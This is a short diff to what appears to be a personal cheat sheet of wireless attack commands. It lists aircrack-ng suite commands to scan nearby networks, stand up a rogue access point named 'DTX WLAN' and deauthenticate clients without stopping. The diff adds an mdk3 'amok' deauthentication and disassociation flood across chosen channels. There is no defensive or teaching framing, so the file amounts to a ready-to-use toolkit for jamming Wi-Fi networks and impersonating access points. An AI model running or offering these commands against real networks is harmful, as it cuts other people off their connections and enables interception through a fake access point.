@@ -1,4 +1,4 @@
-#get networks aroun you
+#get networks around you
 airodump-ng wlan0
 
 #get clients connected to router
@@ -9,3 +9,7 @@ airbase-ng -e "DTX WLAN" -a <mac> -c 1 wlan0
 
 #deauth
 aireplay-ng --deauth 0 -a <router mac> -c <client mac> wlan0
+
+#deauth / disassociation amok attack - mdk3
+airmon-ng start wlan0 #starts wlan0 in monitor mode with interfacename "wlan0mon"
+mdk3 wlan0mon d -c <channel(s)> #channels seperated with ","
